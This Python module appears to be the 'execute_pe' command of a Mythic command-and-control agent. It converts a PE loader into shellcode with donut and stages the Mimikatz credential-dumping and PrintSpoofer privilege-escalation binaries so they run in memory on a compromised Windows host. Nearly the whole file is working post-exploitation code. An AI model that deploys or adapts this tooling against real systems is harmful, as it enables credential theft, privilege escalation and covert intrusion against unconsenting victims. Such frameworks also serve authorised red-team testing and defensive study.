from mythic_payloadtype_container.MythicCommandBase import *
import json
from uuid import uuid4
from sRDI import ShellcodeRDI
from mythic_payloadtype_container.MythicRPC import *
from os import path
import base64
import donut

PRINTSPOOFER_FILE_ID = ""
MIMIKATZ_FILE_ID = ""

PE_VARNAME = "pe_id"

class ExecutePEArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {}

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Require a PE to execute.\n\tUsage: {}".format(ExecutePECommand.help_cmd))
        parts = self.command_line.split(" ", maxsplit=1)
        self.add_arg("pe_name", parts[0])
        self.add_arg("pe_arguments", "")
        if len(parts) == 2:
            self.add_arg("pe_arguments", parts[1])


class ExecutePECommand(CommandBase):
    cmd = "execute_pe"
    needs_admin = False
    help_cmd = "execute_pe [PE.exe] [args]"
    description = "Executes a .NET assembly with the specified arguments. This assembly must first be known by the agent using the `register_assembly` command."
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = ExecutePEArguments
    attackmapping = ["T1547"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        global MIMIKATZ_FILE_ID
        global PRINTSPOOFER_FILE_ID
        global PE_VARNAME

        task.args.add_arg("pipe_name", str(uuid4()))
        exePath = "/srv/ExecutePE.exe"
        mimikatz_path = "/Mythic/agent_code/mimikatz_x64.exe"
        printspoofer_path = "/Mythic/agent_code/PrintSpoofer_x64.exe"
        shellcode_path = "/tmp/loader.bin"


        
        
        donutPath = "/Mythic/agent_code/donut"
        command = "chmod 777 {}; chmod +x {}".format(donutPath, donutPath)
        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE)
        stdout, stderr = await proc.communicate()
        
        command = "{} -f 1 {} -p \"{}\"".format(donutPath, exePath, task.args.get_arg("pipe_name"))
        # need to go through one more step to turn our exe into shellcode
        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                        stderr=asyncio.subprocess.PIPE, cwd="/tmp/")
        stdout, stderr = await proc.communicate()
        
        stdout_err = f'[stdout]\n{stdout.decode()}\n'
        stdout_err = f'[stderr]\n{stderr.decode()}'

        if (not path.exists(shellcode_path)):
            raise Exception("Failed to create shellcode:\n{}".format(stdout_err))
        else:
            with open(shellcode_path, "rb") as f:
                shellcode = f.read()
            shellcode = base64.b64encode(shellcode).decode()

            file_resp = await MythicRPC().execute("create_file",
                                                task_id=task.id,
                                                file=shellcode,
                                                delete_after_fetch=False)
            if file_resp.status == MythicStatus.Success:
                task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
            else:
                raise Exception("Failed to register ExecutePE shellcode: " + file_resp.error)

        # I know I could abstract these routines out but I'm rushing
        if task.args.get_arg("pe_name") == "mimikatz.exe":
            if MIMIKATZ_FILE_ID != "":
                task.args.add_arg(PE_VARNAME, MIMIKATZ_FILE_ID)
            else:
                with open(mimikatz_path, "rb") as f:
                    mimibytes = f.read()
                b64mimi = base64.b64encode(mimibytes).decode()
                file_resp = await MythicRPC().execute("create_file",
                            task_id=task.id,
                            file=b64mimi,
                            delete_after_fetch=False)
                if file_resp.status == MythicStatus.Success:
                    task.args.add_arg(PE_VARNAME, file_resp.response["agent_file_id"])
                    MIMIKATZ_FILE_ID = file_resp.response["agent_file_id"]
                else:
                    raise Exception("Failed to register Mimikatz: " + file_resp.error)
        elif task.args.get_arg("pe_name") == "printspoofer.exe":
            if PRINTSPOOFER_FILE_ID != "":
                task.args.add_arg(PE_VARNAME, PRINTSPOOFER_FILE_ID)
            else:
                with open(printspoofer_path, "rb") as f:
                    psbytes = f.read()
                b64ps = base64.b64encode(psbytes).decode()
                file_resp = await MythicRPC().execute("create_file",
                            task_id=task.id,
                            file=b64ps,
                            delete_after_fetch=False)
                if file_resp.status == MythicStatus.Success:
                    task.args.add_arg(PE_VARNAME, file_resp.response["agent_file_id"])
                    PRINTSPOOFER_FILE_ID = file_resp.response["agent_file_id"]
                else:
                    raise Exception("Failed to register PrintSpoofer: " + file_resp.error)
        return task

    async def process_response(self, response: AgentResponse):
        pass
